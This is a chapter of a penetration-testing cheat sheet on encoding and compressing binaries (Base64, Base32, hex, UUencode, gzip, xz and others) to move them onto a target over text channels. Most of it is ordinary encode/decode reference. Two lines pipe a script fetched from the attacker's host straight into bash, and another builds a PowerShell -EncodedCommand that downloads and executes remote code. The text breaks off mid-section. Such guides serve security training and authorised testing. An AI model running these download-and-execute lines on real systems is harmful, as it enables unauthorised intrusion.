# 10 - Encoding (encodings and compression)

> [← README](../../README.md) · [Next section →](11-encryption.md)

For when there's no network at all (only a console / clipboard), or when the binary gets mangled in transit. The idea is always the same: **encode the binary as text -> move it any way you can -> decode it back**. For transfer over a network, see [01](01-attacker-to-target.md) / [02](02-target-to-attacker.md).

> Most of the CLI tools are on Linux (usually on the attacker's side). For a Windows target, the most reliable options are base64 via `certutil`/PowerShell. Exotic formats (Base58/45/85, yEnc) are easier to run through Python.
>
> **Where to run what:** the `encode` command runs where the file is, and `decode` runs on the receiving side. The `LHOST SHELL` / `RHOST SHELL` labels only appear in the Base64 section (where the split is shown clearly); in the other sections `$LHOST` shows up only in the **Download from server** line - that's us serving the file over HTTP, while the pipeline itself runs on the target.

> **Layout of every section:** `Linux` - **Encode -> Decode -> Download from server** (fetch and decode in one line), `Windows` - **Encode / Decode** (PowerShell and/or CMD). `$LHOST` is our machine serving the file over HTTP (e.g. `python3 -m http.server 80`).

---

## Navigation

|  |  |
|---|---|
| [Cheat sheet: what to use for what](#cheat-sheet-what-to-use-for-what) | [Part 1. Encodings / representations](#part-1-encodings--representations) |
| [Base64](#base64) | [Base64url (URL-safe)](#base64url-url-safe) |
| [Base32](#base32) | [Base32hex](#base32hex) |
| [Base16 / Hex](#base16--hex) | [Base58](#base58) |
| [Base45](#base45) | [Base91](#base91) |
| [Base62 (URL-safe)](#base62-url-safe) | [Base85 / Ascii85 / RFC1924 / Z85](#base85--ascii85--rfc1924--z85) |
| [Base2048 / Base32768 / Base65536 (Unicode channels)](#base2048--base32768--base65536-unicode-channels) | [UUencode](#uuencode) |
| [yEnc](#yenc) | [Octal (base-8 representation)](#octal-base-8-representation) |
| [UTF-16LE](#utf-16le) | [ROT (ROT13 / ROT47 / ROT18)](#rot-rot13--rot47--rot18) |
| [Part 2. Compression / packing](#part-2-compression--packing) | [gzip](#gzip) |
| [bzip2](#bzip2) | [xz / LZMA2](#xz--lzma2) |
| [zlib / DEFLATE (raw)](#zlib--deflate-raw) | [tar (packing directories)](#tar-packing-directories) |
| [ZIP](#zip) | [7z](#7z) |
| [zstd (Zstandard)](#zstd-zstandard) | [lz4](#lz4) |
| [brotli](#brotli) | [lzip / lrzip / lzop](#lzip--lrzip--lzop) |
| [compress (.Z) / bzip3 / snappy](#compress-z--bzip3--snappy) | [RAR](#rar) |
| [CAB / cpio / ar (rare archives)](#cab--cpio--ar-rare-archives) | [Part 3. Web / MIME / text escaping](#part-3-web--mime--text-escaping) |
| [URL-encoding (percent-encoding)](#url-encoding-percent-encoding) | [HTML entities](#html-entities) |
| [Quoted-printable](#quoted-printable) | [Punycode / IDN](#punycode--idn) |
| [Unicode escaping (`\uXXXX`, `\xNN`, UTF-7)](#unicode-escaping-uxxxx-xnn-utf-7) | [PGP / MIME ASCII armor](#pgp--mime-ascii-armor) |
| [Part 4. Classics and covert channels](#part-4-classics-and-covert-channels) | [Atbash / Caesar (classical substitutions)](#atbash--caesar-classical-substitutions) |
| [Morse / A1Z26 / Binary / Decimal](#morse--a1z26--binary--decimal) | [Zero-width / Unicode steganography](#zero-width--unicode-steganography) |
| [QR code as a channel](#qr-code-as-a-channel) | [Full set: `linenum.sh` in every encoding](#full-set-linenumsh-in-every-encoding) |
| [SOUNDCLOUD - payload delivery via a public BIO field](#soundcloud---payload-delivery-via-a-public-bio-field) | [Interesting combinations](#interesting-combinations) |

## Flags: quick reference

I've collected the flags that come up below. Across different utilities they don't always mean the same thing, so check the section.

### OpenSSL `enc`

| Flag | What it does |
|---|---|
| `enc` | encryption/decryption mode |
| `-aes-256-cbc` | algorithm: AES-256 in CBC mode |
| `-pbkdf2` | use PBKDF2 instead of the legacy `EVP_BytesToKey` |
| `-iter 100000` | PBKDF2 iteration count; higher = slower brute force |
| `-salt` | random salt in the header (on by default in modern OpenSSL) |
| `-d` | decrypt |
| `-in FILE`, `-out FILE` | input and output files |
| `-pass env:PASS` | password from an environment variable; also `file:`, `fd:`, `stdin` |
| `-k 'pass'` | password right on the command line: visible in `ps` and history, labs only |
| `-base64` | wrap the result in base64 |
| `-md sha256` | digest for PBKDF2; `sha256` is the default in OpenSSL 1.1.1+, `md5` in older versions |
| `-nosalt` | no salt; not recommended |

> **`-cbc` is a mode, not a separate cipher.** `-aes-256-cbc` = AES-256 + CBC. CBC needs a random IV and padding, and **provides no integrity**: without HMAC/AEAD the ciphertext can be modified. For new systems prefer AEAD (GCM/ChaCha20-Poly1305). More detail in [11 - Encryption](11-encryption.md#block-cipher-modes).

### Encodings and hex

| Command | Flag | What it does |
|---|---|---|
| `base64` | `-w0` | no line wrapping |
| `base64` | `-d` | decode |
| `basenc` | `--base64url`, `--base32`, `--base32hex`, `--base16`, `--z85` | choose the alphabet |
| `basenc` | `-d` | decode |
| `xxd` | `-p` | plain hex dump |
| `xxd` | `-r -p` | reverse plain hex |
| `base32` | `-w0` | no line wrapping |
| `uuencode` | `IN NAME` | input and the filename for the header |
| `uudecode` | `-o FILE` | where to write the result |

### Compression and archives

| Command | Flag | What it does |
|---|---|---|
| `gzip` / `bzip2` / `xz` | `-c` | write to stdout |
| same | `-d` | decompress |
| `gzip` / `bzip2` | `-k` | keep the source file |
| `gzip` / `bzip2` / `xz` | `-9`, `-9e` | maximum compression (`-9e` = extreme for xz) |
| `tar` | `c` / `x` | create / extract |
| `tar` | `f` | archive name |
| `tar` | `z` / `J` / `--zstd` | gzip / xz / zstd |
| `tar` | `-C DIR` | extract into a directory |
| `zip` | `-r` | recursive |
| `zip` | `-e` | prompt for a password |
| `zip` | `-P PASS` | password on the command line (visible in `ps`) |
| `7z` | `a` / `x` | add / extract |
| `7z` | `-pPASS` | password |
| `7z` | `-mhe=on` | encrypt the file names |
| `7z` | `-mx=9` | maximum compression |
| `zstd` / `lz4` / `brotli` | `-d` | decompress |
| `zstd` | `-19`, `-T0` | maximum / all cores |
| `lz4` | `-9` | maximum |
| `brotli` | `-q 11` | maximum quality |
| `rar` | `a` / `x` | add / extract |
| `rar` | `-hpPASS` | password + header encryption |
| `unrar` | `x` | extract with paths |

### HTTP and text

| Command | Flag | What it does |
|---|---|---|
| `curl` | `-s` | silent |
| `curl` | `-o FILE` | save to a file |
| `curl` | `-H 'Name: value'` | add a header |
| `curl` | `--compressed` | accept gzip/deflate/br and decompress |
| `python3 -c` | `quote(..., safe='')` | URL-encode every character |
| `python3 -c` | `unquote(...)` | URL-decode |
| `python3 -c` | `html.escape/unescape` | HTML entities |
| `python3 -c` | `quopri.encode/decode` | quoted-printable |
| `idn2` | `-d` | Punycode -> Unicode |
| `qrencode` | `-o FILE` | output image |
| `zbarimg` | `-q --raw` | data only, no service output |

---

## Cheat sheet: what to use for what

| Encoding | Linux | Windows |
|-----------|----------|------------|
| Base64 | `base64` | `certutil`, PowerShell |
| Base64url | `basenc` | PowerShell |
| Base32 / Base32hex | `base32`, `basenc` | Python |
| Base16 / Hex | `xxd`, `basenc` | PowerShell, `Format-Hex` |
| Base58 / Base45 | Python | Python |
| Base62 / Base91 | Python | Python |
| Base85 / Ascii85 / RFC1924 | Python | Python |
| Z85 | `basenc` | Python |
| Base2048 / Base32768 / Base65536 | Python | Python |
| UUencode / XXencode / Yyencode | `uuencode`, `uudeview` | Python |
| Octal | `od`, Python | PowerShell |
| UTF-16LE | `iconv` | PowerShell |
| ROT13 / ROT47 / ROT18 | `tr` | PowerShell |
| URL / HTML / Quoted-printable | Python, `jq` | PowerShell, Python |
| Punycode / IDN | `idn2` | PowerShell |
| PGP / MIME ASCII armor | `gpg`, `openssl` | `gpg`, `certutil` |
| Morse / A1Z26 / Binary / Decimal | Python | Python |
| Zero-width / Unicode stego | Python | Python |
| yEnc | Python | Python |

---

# Part 1. Encodings / representations

## Base64

Flags: `-w0` - no line wrapping; `-d` - decode; `base64` reads stdin and writes stdout.

The most universal one: available anywhere `base64` or `certutil` exists.

### Linux

**Encode:**
```bash
base64 -w0 file.bin > file.b64
```

**Decode:**
```bash
base64 -d file.b64 > file.bin
```

**Download from server + decode (RHOST, without writing to disk):**
```bash
curl -s http://$LHOST/file.b64 | base64 -d > file.bin

# or execute it right away without saving:
curl -s http://$LHOST/linenum.b64 | base64 -d | bash
```

### Windows

**Encode - PowerShell:**
```powershell
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\file.bin"))
[IO.File]::WriteAllText("file.b64", $b64)
```

**Encode - CMD (certutil, with PEM headers):**
```cmd
certutil -encode file.bin file.b64
```

**Decode - PowerShell:**
```powershell
$bytes = [Convert]::FromBase64String((Get-Content -Raw file.b64))
[IO.File]::WriteAllBytes("file.bin", $bytes)
```

**Decode - CMD (certutil):**
```cmd
certutil -decode file.b64 file.bin
```

**Download from server + decode - PowerShell:**
```powershell
iwr "http://${LHOST}/file.b64" -OutFile file.b64
certutil -decode file.b64 file.bin
```

> `certutil -encode` adds `-----BEGIN CERTIFICATE-----` and wraps lines at 64 characters. `certutil -decode` understands that, GNU `base64 -d` on Linux does not. Don't mix them: if it was encoded with certutil, decode it with certutil (or strip the headers and line breaks).

---

## Base64url (URL-safe)

Flags: `--base64url` - URL-safe alphabet; `-d` - decode.

Same as base64, but `+/` become `-_` and the `=` padding is dropped. Doesn't break in URLs or filenames.

### Linux

**Encode:**
```bash
basenc --base64url file.bin > file.b64url
```

**Decode:**
```bash
basenc -d --base64url file.b64url > file.bin
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b64url | basenc -d --base64url > file.bin
```

### Windows

**Encode - PowerShell:**
```powershell
$b = [Convert]::ToBase64String([IO.File]::ReadAllBytes("file.bin"))
$b.TrimEnd('=').Replace('+','-').Replace('/','_') | Set-Content file.b64url
```

**Decode - PowerShell:**
```powershell
$s = (Get-Content -Raw file.b64url).Trim().Replace('-','+').Replace('_','/')
switch ($s.Length % 4) { 2 { $s += '==' } 3 { $s += '=' } }
[IO.File]::WriteAllBytes("file.bin", [Convert]::FromBase64String($s))
```

**Download from server + decode - PowerShell:**
```powershell
iwr "http://${LHOST}/file.b64url" -OutFile file.b64url
# then the decode block above
```

---

## Base32

Flags: `-w0` - no line wrapping; `-d` - decode; `basenc --base32` - same alphabet.

Only `A-Z` and `2-7` - survives case-insensitive channels (e.g. dictation or reading over the phone).

### Linux

**Encode:**
```bash
base32 -w0 file.bin > file.b32        # or: basenc --base32 file.bin > file.b32
```

**Decode:**
```bash
base32 -d file.b32 > file.bin         # or: basenc -d --base32 file.b32 > file.bin
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b32 | base32 -d > file.bin
```

### Windows

No native tool - go through Python.

**Encode:**
```powershell
python -c "import base64;print(base64.b32encode(open('file.bin','rb').read()).decode())" > file.b32
```

**Decode:**
```powershell
python -c "import base64;open('file.bin','wb').write(base64.b32decode(open('file.b32').read().strip()))"
```

**Download from server + decode:**
```powershell
iwr "http://${LHOST}/file.b32" -OutFile file.b32
python -c "import base64;open('file.bin','wb').write(base64.b32decode(open('file.b32').read().strip()))"
```

---

## Base32hex

Flags: `--base32hex` - alphabet `0-9A-V`; `-d` - decode.

A Base32 variant with an "extended hex" alphabet (`0-9A-V`) that preserves sort order.

### Linux

**Encode:**
```bash
basenc --base32hex file.bin > file.b32h
```

**Decode:**
```bash
basenc -d --base32hex file.b32h > file.bin
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b32h | basenc -d --base32hex > file.bin
```

### Windows

Through Python (needs 3.10+ for `b32hexencode`).

**Encode:**
```powershell
python -c "import base64;print(base64.b32hexencode(open('file.bin','rb').read()).decode())" > file.b32h
```

**Decode:**
```powershell
python -c "import base64;open('file.bin','wb').write(base64.b32hexdecode(open('file.b32h').read().strip()))"
```

---

## Base16 / Hex

Flags: `xxd -p` - plain hex; `xxd -r -p` - reverse plain hex; `basenc --base16`/`-d` - the same thing.

### Linux

**Encode (via `xxd`):**
```bash
xxd -p file.bin | tr -d '\n' > file.hex
```

**Encode (via `basenc`):**
```bash
basenc --base16 file.bin > file.hex
```

**Decode:**
```bash
xxd -r -p file.hex > file.bin          # or: basenc -d --base16 file.hex > file.bin
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.hex | xxd -r -p > file.bin
```

### Windows

**Encode - PowerShell:**
```powershell
$bytes = [IO.File]::ReadAllBytes("file.bin")
($bytes | ForEach-Object { $_.ToString("x2") }) -join '' | Set-Content file.hex
```

**Decode - PowerShell:**
```powershell
$hex = (Get-Content file.hex -Raw) -replace '\s',''
$bytes = for ($i=0; $i -lt $hex.Length; $i+=2) { [Convert]::ToByte($hex.Substring($i,2),16) }
[IO.File]::WriteAllBytes("file.bin", $bytes)
```

**Download from server + decode - PowerShell:**
```powershell
iwr "http://${LHOST}/file.hex" -OutFile file.hex
# then the decode block above
```

**Look at the hex of any file:**
```powershell
Format-Hex file.bin
```

---

## Base58

Flags: the Python functions don't have flags: `base58.b58encode()` / `b58decode()`; leading zero bytes are not preserved.

Bitcoin alphabet - no lookalike characters (`0OIl`), no `+/`. More compact than hex. Python only (Linux and Windows).

### Linux

```bash
pip install base58        # or CLI: apt install base58
```

**Encode:**
```bash
python3 -c "import base58,sys; sys.stdout.write(base58.b58encode(open('file.bin','rb').read()).decode())" > file.b58
```

**Decode:**
```bash
python3 -c "import base58; open('file.bin','wb').write(base58.b58decode(open('file.b58').read().strip()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b58 | python3 -c "import sys,base58; sys.stdout.buffer.write(base58.b58decode(sys.stdin.buffer.read().strip()))" > file.bin
```

### Windows

```powershell
pip install base58
```

**Encode / Decode:**
```powershell
python -c "import base58;open('file.b58','w').write(base58.b58encode(open('file.bin','rb').read()).decode())"
python -c "import base58;open('file.bin','wb').write(base58.b58decode(open('file.b58').read().strip()))"
```

---

## Base45

Flags: `base45.b45encode()` / `b45decode()`; the alphabet is designed for QR/text channels.

RFC 9285 (used, for example, in EU Digital COVID Certificate QR codes). Niche, Python only.

### Linux

```bash
pip install base45
```

**Encode:**
```bash
python3 -c "import base45; print(base45.b45encode(open('file.bin','rb').read()).decode())" > file.b45
```

**Decode:**
```bash
python3 -c "import base45; open('file.bin','wb').write(base45.b45decode(open('file.b45').read().strip()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b45 | python3 -c "import sys,base45; sys.stdout.buffer.write(base45.b45decode(sys.stdin.buffer.read().strip()))" > file.bin
```

### Windows

```powershell
pip install base45
```

**Encode / Decode:**
```powershell
python -c "import base45;open('file.b45','w').write(base45.b45encode(open('file.bin','rb').read()).decode())"
python -c "import base45;open('file.bin','wb').write(base45.b45decode(open('file.b45').read().strip()))"
```

---

## Base91

Flags: `base91.b91encode()` / `b91decode()`; more compact than Base64, but less supported.

Denser than Base64 (~23% shorter), with a 91-character printable ASCII alphabet. Handy when every character counts. Python only.

### Linux

```bash
pip install base91
```

**Encode:**
```bash
python3 -c "import base91,sys; sys.stdout.write(base91.encode(open('file.bin','rb').read()))" > file.b91
```

**Decode:**
```bash
python3 -c "import base91; open('file.bin','wb').write(base91.decode(open('file.b91').read().strip()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b91 | python3 -c "import sys,base91; sys.stdout.buffer.write(base91.decode(sys.stdin.read().strip()))" > file.bin
```

### Windows

```powershell
pip install base91
python -c "import base91;open('file.b91','w').write(base91.encode(open('file.bin','rb').read()))"
python -c "import base91;open('file.bin','wb').write(base91.decode(open('file.b91').read().strip()))"
```

---

## Base62 (URL-safe)

Flags: `pybase62.b62encode()` / `b62decode()`; leading zero bytes may be lost.

`0-9A-Za-z` - letters and digits only, no `+/=` and no `-_`. The classic for short tokens/IDs in URLs. Python only.

### Linux

```bash
pip install pybase62
```

**Encode:**
```bash
python3 -c "import base62,sys; sys.stdout.write(base62.encodebytes(open('file.bin','rb').read()))" > file.b62
```

**Decode:**
```bash
python3 -c "import base62; open('file.bin','wb').write(base62.decodebytes(open('file.b62').read().strip()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b62 | python3 -c "import sys,base62; sys.stdout.buffer.write(base62.decodebytes(sys.stdin.read().strip()))" > file.bin
```

### Windows

```powershell
pip install pybase62
python -c "import base62;open('file.b62','w').write(base62.encodebytes(open('file.bin','rb').read()))"
python -c "import base62;open('file.bin','wb').write(base62.decodebytes(open('file.b62').read().strip()))"
```

> Base58/Base62 don't preserve leading zero bytes (`pybase62`: `b'\x00'` -> `0` -> `b''`). For binaries, either add a length marker/checksum, or use Base64/Base91.

---

## Base85 / Ascii85 / RFC1924 / Z85

Flags: Python - `base64.a85encode/a85decode`, `b85encode/b85decode`; `basenc --z85`/`-d --z85` - the ZeroMQ alphabet.

The Base85 family is ~20% more compact than Base64. There are different alphabets - it matters that you encode and decode with **the same one**.

### Linux

**Ascii85 (Adobe, from PDF/PostScript):**
```bash
# encode
python3 -c "import base64,sys; sys.stdout.buffer.write(base64.a85encode(open('file.bin','rb').read()))" > file.a85
# decode
python3 -c "import base64; open('file.bin','wb').write(base64.a85decode(open('file.a85','rb').read()))"
```

**Base85 / RFC1924 (Git/Mercurial alphabet, `base64.b85encode`):**
```bash
# encode
python3 -c "import base64,sys; sys.stdout.buffer.write(base64.b85encode(open('file.bin','rb').read()))" > file.b85
# decode
python3 -c "import base64; open('file.bin','wb').write(base64.b85decode(open('file.b85','rb').read()))"
```

**Z85 (ZeroMQ):** via `basenc` - the input length must be a multiple of 4 (for decode, a multiple of 5):
```bash
basenc --z85 file.bin > file.z85
basenc -d --z85 file.z85 > file.bin
```

**Download from server + decode:**
```bash
# Ascii85
curl -s http://$LHOST/file.a85 | python3 -c "import sys,base64; sys.stdout.buffer.write(base64.a85decode(sys.stdin.buffer.read()))" > file.bin
# Z85
curl -s http://$LHOST/file.z85 | basenc -d --z85 > file.bin
```

### Windows

Through Python (same commands, `python` instead of `python3`).

**Ascii85:**
```powershell
python -c "import base64,sys;sys.stdout.buffer.write(base64.a85encode(open('file.bin','rb').read()))" > file.a85
python -c "import base64;open('file.bin','wb').write(base64.a85decode(open('file.a85','rb').read()))"
```

**Base85 / RFC1924:**
```powershell
python -c "import base64,sys;sys.stdout.buffer.write(base64.b85encode(open('file.bin','rb').read()))" > file.b85
python -c "import base64;open('file.bin','wb').write(base64.b85decode(open('file.b85','rb').read()))"
```

---

## Base2048 / Base32768 / Base65536 (Unicode channels)

Flags: the Python modules have none: `base2048.encode/decode`, `base32768.encode/decode`, `base65536.encode/decode`.

They encode data **into Unicode characters** - 11/15/16 bits per character. For shipping through Twitter/Discord/chat, where the limit is characters rather than bytes. Python only.

- **Base2048** - 11 bits/char, tuned for Twitter's limits (about 385 bytes per tweet).
- **Base32768** - 15 bits/char.
- **Base65536** - 16 bits/char (2 bytes per code point).

### Linux

```bash
pip install base2048 base32768 base65536
```

**Encode / Decode (Base2048; the others are the same with the module name swapped):**
```bash
# encode
python3 -c "import base2048,sys; sys.stdout.write(base2048.encode(open('file.bin','rb').read()))" > file.b2048
# decode
python3 -c "import base2048; open('file.bin','wb').write(base2048.decode(open('file.b2048',encoding='utf-8').read().strip()))"
```

**Base32768 / Base65536:**
```bash
python3 -c "import base32768,sys; sys.stdout.write(base32768.encode(open('file.bin','rb').read()))" > file.b32768
python3 -c "import base32768; open('file.bin','wb').write(base32768.decode(open('file.b32768',encoding='utf-8').read().strip()))"

python3 -c "import base65536,sys; sys.stdout.write(base65536.encode(open('file.bin','rb').read()))" > file.b65536
python3 -c "import base65536; open('file.bin','wb').write(base65536.decode(open('file.b65536',encoding='utf-8').read().strip()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b2048 | python3 -c "import sys,base2048; sys.stdout.buffer.write(base2048.decode(sys.stdin.read().strip()))" > file.bin
```

### Windows

Through Python (same commands, `python` instead of `python3`).

> For an "emoji channel" this is the most compact way to push a binary through social media text.

---

## UUencode

Flags: `uuencode INPUT NAME` - the filename goes into the header; `uudecode -o FILE` - override the name.

The Unix classic for relaying binaries over e-mail/Usenet. From the `sharutils` package.

### Linux

```bash
apt install sharutils
```

**Encode (the second argument is the filename on extraction):**
```bash
uuencode file.bin file.bin > file.uu
```

**Decode (the name comes from the header):**
```bash
uudecode file.uu
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.uu -o file.uu && uudecode file.uu
```

**Decode without `uudecode`** (no toolkit needed):
```bash
# Python
python3 -c "import codecs; open('output.sh', 'wb').write(codecs.decode(open('linenum.uu', 'rb').read(), 'uu'))"
# Perl
perl -ne 'print unpack("u", $_)' linenum.uu > output.sh
```

**Relatives: XXencode / Yyencode / btoa** - the same ideas with a different alphabet. `uudeview` can recognise and unpack almost any of them (as well as uu/base64/yEnc):

```bash
apt install uudeview
uudeview file.uu          # format autodetect and unpack
uudeview -i file.uu       # -i = interactive mode
```

### Windows

Through Python (same one-liners, `python` instead of `python3`).

---

## yEnc

Flags: `yenc.encode(in, out, size)` / `yenc.decode(in, out)`; these are module functions, not CLI flags.

Usenet binary encoding (more efficient than UUencode). Rare - needs a separate module/tool.

### Linux

```bash
pip install yenc
```

**Encode:**
```bash
python3 -c "import yenc; yenc.encode(open('file.bin','rb'), open('file.ye','wb'), __import__('os').path.getsize('file.bin'))"
```

**Decode:**
```bash
python3 -c "import yenc; yenc.decode(open('file.ye','rb'), open('file.bin','wb'))"
```

### Windows

```powershell
pip install yenc
python -c "import yenc;yenc.encode(open('file.bin','rb'),open('file.ye','wb'),__import__('os').path.getsize('file.bin'))"
python -c "import yenc;yenc.decode(open('file.ye','rb'),open('file.bin','wb'))"
```

> If the module isn't available - some distributions ship `yencode` / `ydecode` CLIs.

---

## Octal (base-8 representation)

Flags: `od -An -to1 -v` - octal bytes, no addresses and no repeat suppression; `printf` interprets `\NNN`.

### Linux

**Encode:**
```bash
od -An -v -to1 file.bin | tr -s ' ' '\n' | grep . > file.oct
```

**Decode:**
```bash
python3 -c "open('file.bin','wb').write(bytes(int(x,8) for x in open('file.oct').read().split()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.oct | python3 -c "import sys; open('file.bin','wb').write(bytes(int(x,8) for x in sys.stdin.read().split()))"
```

### Windows

**Encode - PowerShell:**
```powershell
$bytes = [IO.File]::ReadAllBytes("file.bin")
($bytes | ForEach-Object { [Convert]::ToString($_,8).PadLeft(3,'0') }) -join ' ' | Set-Content file.oct
```

**Decode - PowerShell:**
```powershell
$oct = (Get-Content file.oct -Raw).Split(" `t`r`n", [StringSplitOptions]::RemoveEmptyEntries)
[IO.File]::WriteAllBytes("file.bin", [byte[]]($oct | ForEach-Object { [Convert]::ToByte($_,8) }))
```

---

## UTF-16LE

Flags: `iconv -f UTF-8 -t UTF-16LE` - from UTF-8 to UTF-16LE; for the reverse, swap `-f` and `-t`.

Text transcoding (not compression). Often needed for PowerShell `-EncodedCommand` (it expects base64 of UTF-16LE).

### Linux

**Encode:**
```bash
iconv -f UTF-8 -t UTF-16LE in.txt > out.txt
```

**Decode:**
```bash
iconv -f UTF-16LE -t UTF-8 out.txt > in.txt
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.utf16 | iconv -f UTF-16LE -t UTF-8 > file.txt
```

**Payload for `powershell -EncodedCommand`:**
```bash
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://'"$LHOST"'/s.ps1")' | iconv -t UTF-16LE | base64 -w0
# then on the target:  powershell -EncodedCommand <string>
```

### Windows

**Encode - PowerShell:**
```powershell
[IO.File]::WriteAllText("out.txt", (Get-Content -Raw in.txt), [Text.Encoding]::Unicode)
```

**Decode - PowerShell:**
```powershell
[IO.File]::WriteAllText("in.txt", [IO.File]::ReadAllText("out.txt", [Text.Encoding]::Unicode))
```

**Download from server + decode - PowerShell:**
```powershell
iwr "http://${LHOST}/file.utf16" -OutFile file.utf16
[IO.File]::WriteAllText("file.txt", [IO.File]::ReadAllText("file.utf16", [Text.Encoding]::Unicode))
```

---

## ROT (ROT13 / ROT47 / ROT18)

Flags: `tr 'A-Za-z' 'N-ZA-Mn-za-m'` - ROT13; `tr '!-~' 'P-~!-O'` - ROT47; the ranges define the shift.

Character substitution - obfuscation, not encryption. Self-reversible.

- **ROT13** - Latin letters only.
- **ROT47** - all printable ASCII (`!`-`~`), including digits and symbols.
- **ROT5** - digits only. **ROT18** = ROT13 + ROT5.

### Linux

**ROT13 (encode = decode):**
```bash
echo "Secret Message" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**ROT47 (encode = decode):**
```bash
echo "Hello, World! 123" | tr '!-~' 'P-~!-O'
```

**ROT5 / ROT18:**
```bash
echo "12345" | tr '0-9' '5-90-4'                              # ROT5
echo "Secret 123" | tr 'A-Za-z0-9' 'N-ZA-Mn-za-m5-90-4'       # ROT18
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.rot13 | tr 'A-Za-z' 'N-ZA-Mn-za-m' > file.txt
curl -s http://$LHOST/file.rot47 | tr '!-~' 'P-~!-O' > file.txt
```

### Windows

**ROT13 - PowerShell:**
```powershell
$map = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
$out = -join ((Get-Content -Raw file.txt).ToCharArray() | ForEach-Object {
  if     ($_ -cmatch '[A-Z]') { $map[[int][char]$_ - 65] }
  elseif ($_ -cmatch '[a-z]') { $map[[int][char]$_ - 97 + 26] }
  else                        { $_ }
})
[IO.File]::WriteAllText("file.rot13", $out)
```

**ROT47 - PowerShell:**
```powershell
$out = -join ((Get-Content -Raw file.txt).ToCharArray() | ForEach-Object {
  $c = [int][char]$_
  if ($c -ge 33 -and $c -le 126) { [char](33 + (($c - 33 + 47) % 94)) } else { $_ }
})
[IO.File]::WriteAllText("file.rot47", $out)
```

---

# Part 2. Compression / packing

They reduce size (less to copy/paste or download) and "glue" a binary together. The classic move for a text channel - **compress and wrap in base64**:

```bash
# pack -> text
gzip -c file.bin | base64 -w0 > file.txt

# on the receiving side: text -> unpack
base64 -d file.txt | gunzip > file.bin
```

---

## gzip

Flags: `-k` - keep the source; `-9` - maximum; `-c` - stdout; `-d` - decompress.

### Linux

**Encode (compress):**
```bash
gzip -k -9 file.bin              # -> file.bin.gz (-k = keep the original)
```

**Decode:**
```bash
gunzip file.bin.gz               # or: gzip -d file.bin.gz
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.gz | gunzip > file.bin
```

**Compress -> base64 -> download -> decompress:**
```bash
# LHOST: pack into text
gzip -c file.bin | base64 -w0 > file.b64
# RHOST: fetch and unpack on the fly
curl -s http://$LHOST/file.b64 | base64 -d | gunzip > file.bin
```

### Windows

**Encode - PowerShell (.NET GZipStream):**
```powershell
$in  = [IO.File]::OpenRead("file.bin");  $out = [IO.File]::Create("file.bin.gz")
$gz  = New-Object IO.Compression.GZipStream($out, [IO.Compression.CompressionMode]::Compress)
$in.CopyTo($gz); $gz.Dispose(); $out.Dispose(); $in.Dispose()
```

**Decode - PowerShell:**
```powershell
$in  = [IO.File]::OpenRead("file.bin.gz"); $out = [IO.File]::Create("file.bin")
$gz  = New-Object IO.Compression.GZipStream($in, [IO.Compression.CompressionMode]::Decompress)
$gz.CopyTo($out); $out.Dispose(); $gz.Dispose(); $in.Dispose()
```

**Download from server + decode - PowerShell:**
```powershell
iwr "http://${LHOST}/file.b64" -OutFile file.b64
certutil -decode file.b64 file.bin.gz
# then the decode block above
```

---

## bzip2

Flags: `-k` - keep the source; `-9` - maximum; `-c` - stdout; `-d` - decompress.

Stronger than gzip, slower.

### Linux

**Encode:**
```bash
bzip2 -k file.bin                # -> file.bin.bz2
```

**Decode:**
```bash
bunzip2 file.bin.bz2             # or: bzip2 -d file.bin.bz2
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.bz2 | bunzip2 > file.bin
```

### Windows

Native `bzip2` is rare - use `tar`/`7z` (see below) or the Python `bz2` module:

```powershell
python -c "import bz2,shutil;shutil.copyfileobj(bz2.open('file.bin.bz2','rb'),open('file.bin','wb'))"
python -c "import bz2,shutil;shutil.copyfileobj(bz2.open('file.bin.bz2','wb'),open('file.bin','rb'))"
```

---

## xz / LZMA2

Flags: `-k` - keep the source; `-9e` - maximum; `-c` - stdout; `-d` - decompress; `-T0` - all cores.

The best compression of the classics.

### Linux

**Encode:**
```bash
xz -k -9e file.bin               # -> file.bin.xz  (-9e = maximum)
```

**Decode:**
```bash
unxz file.bin.xz                 # or: xz -d file.bin.xz
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.xz | xz -d > file.bin
```

**Compress -> base64 -> download -> decompress:**
```bash
# LHOST
xz -9 < linenum.sh | base64 -w0 > linenum.sh.xz.b64
# RHOST
curl -s http://$LHOST/linenum.sh.xz.b64 | base64 -d | xz -d > linenum.sh
```

### Windows

**Encode / Decode - via `tar` (Windows 10 1803+) or `7z`:**
```cmd
tar -cJf file.bin.xz file.bin
tar -xJf file.bin.xz
7z a -txz file.bin.xz file.bin
7z x file.bin.xz
```

---

## zlib / DEFLATE (raw)

A bare stream with no gzip wrapper - sometimes needed for exploits/protocols. Python only.

### Linux

**Encode:**
```bash
python3 -c "import zlib; open('file.zz','wb').write(zlib.compress(open('file.bin','rb').read(),9))"
```

**Decode:**
```bash
python3 -c "import zlib; open('file.bin','wb').write(zlib.decompress(open('file.zz','rb').read()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.zz | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > file.bin
```

### Windows

Through Python (same commands, `python` instead of `python3`).

---

## tar (packing directories)

Flags: `c` - create, `x` - extract, `f` - archive file, `z` - gzip, `J` - xz, `-C DIR` - extraction directory.

### Linux

**Encode / Decode:**
```bash
# pack only
tar cf out.tar dir/
tar xf out.tar

# pack + gzip (the usual choice for exfiltrating a folder)
